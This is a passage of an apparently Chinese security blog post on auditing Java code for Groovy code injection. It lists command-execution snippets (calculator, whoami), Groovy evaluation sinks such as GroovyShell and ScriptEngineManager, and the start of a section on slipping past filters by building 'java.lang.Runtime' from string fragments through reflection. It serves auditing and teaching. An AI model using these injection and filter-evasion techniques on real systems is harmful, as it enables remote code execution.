@@ -1,0 +1,1292 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="Java代码审计之Groovy代码执行, 内网渗透 Python Windows API 钓鱼社工">
+    <meta name="baidu-site-verification" content="fmlEuI34ir">
+    <meta name="google-site-verification" content="yCy2azpds5XSuGZvis6OuA-XIGF5GuGpYRAaGfD6o48">
+    <meta name="360-site-verification" content="b7c11a830ef90fd1464ad6206bb7b6e7">
+    <meta name="description" content="Java代码审计之Groovy代码执行0x01 介绍Groovy是一种基于JVM（Java虚拟机）的敏捷开发语言，它结合了Python、Ruby和Smalltalk的许多强大的特性，Groovy代码能够与Java代码很好地结合，也能用于扩展">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>Java代码审计之Groovy代码执行 | ske的博客</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    <style type="text/css">
+        
+    </style>
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+    <script>
+        var _hmt = _hmt || [];
+        (function () {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?46e79e71af0709a5b9106bf20cecc493";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+    
+        <script>
+            (function(){
+                var bp = document.createElement('script');
+                var curProtocol = window.location.protocol.split(':')[0];
+                if (curProtocol === 'https') {
+                    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+                }
+                else {
+                    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+                }
+                var s = document.getElementsByTagName("script")[0];
+                s.parentNode.insertBefore(bp, s);
+            })();
+        </script>
+    
+
+    <script>
+        (function(){
+        var src = "https://jspassport.ssl.qhimg.com/11.0.1.js?d182b3f28525f2db83acfaaf6e696dba";
+        document.write('<script src="' + src + '" id="sozz"><\/script>');
+        })();
+    </script>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body>
+
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">ske的博客</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>首页</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>标签</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>分类</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>归档</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>关于</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/friends" class="waves-effect waves-light">
+            
+            <i class="fa fa-address-book"></i>
+            
+            <span>友情链接</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/contact" class="waves-effect waves-light">
+            
+            <i class="fa fa-comments"></i>
+            
+            <span>留言板</span>
+        </a>
+    </li>
+    
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="搜索"></i>
+        </a>
+    </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">ske的博客</div>
+        <div class="logo-desc">
+            
+            内网渗透 | Python | Windows API | 钓鱼社工
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                首页
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                标签
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                分类
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                归档
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                关于
+            </a>
+        </li>
+        
+        <li>
+            <a href="/friends" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-address-book"></i>
+                
+                友情链接
+            </a>
+        </li>
+        
+        <li>
+            <a href="/contact" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-comments"></i>
+                
+                留言板
+            </a>
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/SkewwG/hexo-matery-modified" class="waves-effect waves-light" target="_blank">
+                <i class="fa fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/SkewwG/hexo-matery-modified" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/img/Groovy/image-20211102170727475.png')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        Java代码审计之Groovy代码执行
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="container content">
+
+    
+    <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                        <a href="/tags/Java代码审计之Groovy代码执行/" target="_blank">
+                            <span class="chip bg-color">Java代码审计之Groovy代码执行</span>
+                        </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                        <a href="/categories/Java代码审计/" class="post-category" target="_blank">
+                            Java代码审计
+                        </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-11-02
+                </div>
+
+                <div class="post-author info-break-policy">
+                    <i class="fa fa-user-o fa-fw"></i>作者:&nbsp;&nbsp;
+                    
+                    ske
+                    
+                </div>
+
+                
+                
+                <div class="info-break-policy">
+                    <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    1.3k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    5 分
+                </div>
+                
+                
+
+                
+                <div id="busuanzi_container_page_pv" class="info-break-policy">
+                    <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                    <span id="busuanzi_value_page_pv"></span>
+                </div>
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="Java代码审计之Groovy代码执行"><a href="#Java代码审计之Groovy代码执行" class="headerlink" title="Java代码审计之Groovy代码执行"></a>Java代码审计之Groovy代码执行</h1><h2 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h2><p>Groovy是一种基于JVM（Java虚拟机）的敏捷开发语言，它结合了Python、Ruby和Smalltalk的许多强大的特性，Groovy代码能够与Java代码很好地结合，也能用于扩展现有代码。由于其运行在JVM上的特性，Groovy也可以使用其他非Java语言编写的库。</p>
+<p>Groovy是用于Java虚拟机的一种敏捷的动态语言，它是一种成熟的面向对象编程语言，既可以用于面向对象编程，又可以用作纯粹的脚本语言。使用该种语言不必编写过多的代码，同时又具有闭包和动态语言中的其他特性。</p>
+<p>Groovy是JVM的一个替代语言（替代是指可以用Groovy在Java平台上进行Java编程），使用方式基本与使用Java代码的方式相同，该语言特别适合与Spring的动态语言支持一起使用，设计时充分考虑了Java集成，这使Groovy与Java代码的互操作很容易。（注意：不是指Groovy替代Java，而是指Groovy和Java很好的结合编程。）</p>
+<p>Groovy有以下特点：</p>
+<ul>
+<li>同时支持静态和动态类型；</li>
+<li>支持运算符重载；</li>
+<li>本地语法列表和关联数组；</li>
+<li>对正则表达式的本地支持；</li>
+<li>各种标记语言，如XML和HTML原生支持；</li>
+<li>Groovy对于Java开发人员来说很简单，因为Java和Groovy的语法非常相似；</li>
+<li>可以使用现有的Java库；</li>
+<li>Groovy扩展了java.lang.Object；</li>
+</ul>
+<h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>下载Groovy：<a href="http://groovy-lang.org/download.html" target="_blank" rel="noopener">http://groovy-lang.org/download.html</a></p>
+<p>解压之后，使用IDEA新建Groovy项目时选择解压的Groovy目录即可</p>
+<p><img src="/img/Groovy/image-20211102164951317.png" alt="image-20211102164951317"></p>
+<p>然后点击src-&gt;new&gt;groovy class，即可新建一个groovy文件，内容如下：</p>
+<pre class="line-numbers language-groovy"><code class="language-groovy"><span class="token keyword">class</span> <span class="token class-name">test</span> <span class="token punctuation">{</span>
+    <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">{</span>
+        println <span class="token string">"Hello World!"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/img/Groovy/image-20211102164857678.png" alt="image-20211102164857678"></p>
+<p><img src="/img/Groovy/image-20211102165119449.png" alt="image-20211102165119449"></p>
+<h2 id="0x03-Groovy代码注入"><a href="#0x03-Groovy代码注入" class="headerlink" title="0x03 Groovy代码注入"></a>0x03 Groovy代码注入</h2><h3 id="1-执行命令的方式"><a href="#1-执行命令的方式" class="headerlink" title="1.执行命令的方式"></a>1.执行命令的方式</h3><pre class="line-numbers language-groovy"><code class="language-groovy"><span class="token comment" spellcheck="true">// 直接命令执行</span>
+Runtime<span class="token operator">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span>
+<span class="token string">"calc"</span><span class="token operator">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token string">'calc'</span><span class="token operator">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token string">"${"</span>calc<span class="token string">".execute()}"</span>
+<span class="token string">"${'calc'.execute()}"</span>
+
+<span class="token comment" spellcheck="true">// 回显型命令执行</span>
+println <span class="token string">"whoami"</span><span class="token operator">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span>text
+println <span class="token string">'whoami'</span><span class="token operator">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span>text
+println <span class="token string">"${"</span>whoami<span class="token string">".execute().text}"</span>
+println <span class="token string">"${'whoami'.execute().text}"</span>
+<span class="token keyword">def</span> cmd <span class="token operator">=</span> <span class="token string">"whoami"</span><span class="token punctuation">;</span>
+println <span class="token string">"${cmd.execute().text}"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>RCE.groovy代码如下：</p>
+<pre class="line-numbers language-groovy"><code class="language-groovy"><span class="token keyword">class</span> <span class="token class-name">RCE</span> <span class="token punctuation">{</span>
+    <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">def</span> cmd <span class="token operator">=</span> <span class="token string">"open -a Calculator"</span><span class="token punctuation">;</span>
+        Runtime<span class="token operator">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">//        cmd.execute()</span>
+<span class="token comment" spellcheck="true">//        println "${cmd.execute()}";</span>
+
+        <span class="token keyword">def</span> cmd2 <span class="token operator">=</span> <span class="token string">"ls -laht"</span>
+        println cmd2<span class="token operator">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span>text
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/img/Groovy/image-20211102170004915.png" alt="image-20211102170004915"></p>
+<h3 id="2-触发漏洞代码"><a href="#2-触发漏洞代码" class="headerlink" title="2. 触发漏洞代码"></a>2. 触发漏洞代码</h3><pre><code>GroovyShell
+GroovyScriptEngine
+GroovyClassLoader
+ScriptEngineManager</code></pre><p>GroovyShellExample.java代码如下：</p>
+<pre class="line-numbers language-groovy"><code class="language-groovy"><span class="token keyword">import</span> groovy<span class="token operator">.</span>lang<span class="token operator">.</span><span class="token operator">*</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> groovy<span class="token operator">.</span>util<span class="token operator">.</span>GroovyScriptEngine<span class="token punctuation">;</span>
+<span class="token keyword">import</span> groovy<span class="token operator">.</span>util<span class="token operator">.</span>ResourceException<span class="token punctuation">;</span>
+<span class="token keyword">import</span> groovy<span class="token operator">.</span>util<span class="token operator">.</span>ScriptException<span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> javax<span class="token operator">.</span>script<span class="token operator">.</span>ScriptEngine<span class="token punctuation">;</span>
+<span class="token keyword">import</span> javax<span class="token operator">.</span>script<span class="token operator">.</span>ScriptEngineManager<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token operator">.</span>io<span class="token operator">.</span>BufferedReader<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token operator">.</span>io<span class="token operator">.</span>File<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token operator">.</span>io<span class="token operator">.</span>FileReader<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token operator">.</span>io<span class="token operator">.</span>IOException<span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">GroovyShellExample</span> <span class="token punctuation">{</span>
+    <span class="token comment" spellcheck="true">// GroovyShell 直接执行命令</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">func1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        GroovyShell groovyShell <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GroovyShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">// 直接执行命令</span>
+        groovyShell<span class="token operator">.</span><span class="token function">evaluate</span><span class="token punctuation">(</span><span class="token string">"\"open -a Calculator\".execute()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token comment" spellcheck="true">// GroovyShell 运行脚本</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">func2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>
+        GroovyShell groovyShell <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GroovyShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">// 运行脚本</span>
+        Script script <span class="token operator">=</span> groovyShell<span class="token operator">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"src/Test.groovy"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        script<span class="token operator">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token comment" spellcheck="true">// GroovyScriptEngine</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">func3</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ScriptException<span class="token punctuation">,</span> ResourceException <span class="token punctuation">{</span>
+        <span class="token comment" spellcheck="true">// GroovyScriptEngine可从指定的位置（文件系统、URL、数据库等等）加载Groovy脚本，并且随着脚本变化而重新加载它们。如同GroovyShell一样，GroovyScriptEngine也允许传入参数值，并能返回脚本的计算值。</span>
+        GroovyScriptEngine groovyScriptEngine <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GroovyScriptEngine</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        groovyScriptEngine<span class="token operator">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token string">"src/Test.groovy"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Binding</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token comment" spellcheck="true">// GroovyClassLoader</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">func4</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> InstantiationException<span class="token punctuation">,</span> IllegalAccessException <span class="token punctuation">{</span>
+        GroovyClassLoader groovyClassLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GroovyClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Class <span class="token class-name">loadClass</span> <span class="token operator">=</span> groovyClassLoader<span class="token operator">.</span><span class="token function">parseClass</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"src/Test.groovy"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        GroovyObject groovyObject <span class="token operator">=</span> <span class="token punctuation">(</span>GroovyObject<span class="token punctuation">)</span> loadClass<span class="token operator">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        groovyObject<span class="token operator">.</span><span class="token function">invokeMethod</span><span class="token punctuation">(</span><span class="token string">"main"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token comment" spellcheck="true">// 在ScriptEngine中，支持名为“groovy”的引擎，可用来执行Groovy代码。</span>
+    <span class="token comment" spellcheck="true">// ScriptEngine 直接执行命令</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">func5</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> javax<span class="token operator">.</span>script<span class="token operator">.</span>ScriptException <span class="token punctuation">{</span>
+        ScriptEngine groovyEngine <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ScriptEngineManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">getEngineByName</span><span class="token punctuation">(</span><span class="token string">"groovy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        groovyEngine<span class="token operator">.</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"\"open -a Calculator\".execute()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token comment" spellcheck="true">// ScriptEngine 运行脚本</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">func6</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
+        ScriptEngine groovyEngine <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ScriptEngineManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">getEngineByName</span><span class="token punctuation">(</span><span class="token string">"groovy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        String code <span class="token operator">=</span> <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token string">"src/1.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        groovyEngine<span class="token operator">.</span><span class="token function">eval</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">readfile</span><span class="token punctuation">(</span>String filename<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
+        BufferedReader <span class="token keyword">in</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        String string <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
+        String str<span class="token punctuation">;</span>
+        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>str <span class="token operator">=</span> <span class="token keyword">in</span><span class="token operator">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            string <span class="token operator">=</span> string <span class="token operator">+</span> str<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> string<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+
+
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
+        GroovyShellExample groovyShellExample <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GroovyShellExample</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">//        groovyShellExample.func1();</span>
+<span class="token comment" spellcheck="true">//        groovyShellExample.func2();</span>
+<span class="token comment" spellcheck="true">//        groovyShellExample.func3();</span>
+<span class="token comment" spellcheck="true">//        groovyShellExample.func4();</span>
+<span class="token comment" spellcheck="true">//        groovyShellExample.func5();</span>
+        groovyShellExample<span class="token operator">.</span><span class="token function">func6</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="0x04-绕过"><a href="#0x04-绕过" class="headerlink" title="0x04 绕过"></a>0x04 绕过</h2><h3 id="1-反射和字符串拼接"><a href="#1-反射和字符串拼接" class="headerlink" title="1. 反射和字符串拼接"></a>1. 反射和字符串拼接</h3><p>bypassReflect.java</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Method<span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">bypassReflect</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
+        Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> rt <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.la"</span> <span class="token operator">+</span> <span class="token string">"ng.Run"</span> <span class="token operator">+</span> <span class="token string">"time"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Method gr <span class="token operator">=</span> rt<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getR"</span> <span class="token operator">+</span> <span class="token string">"untime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
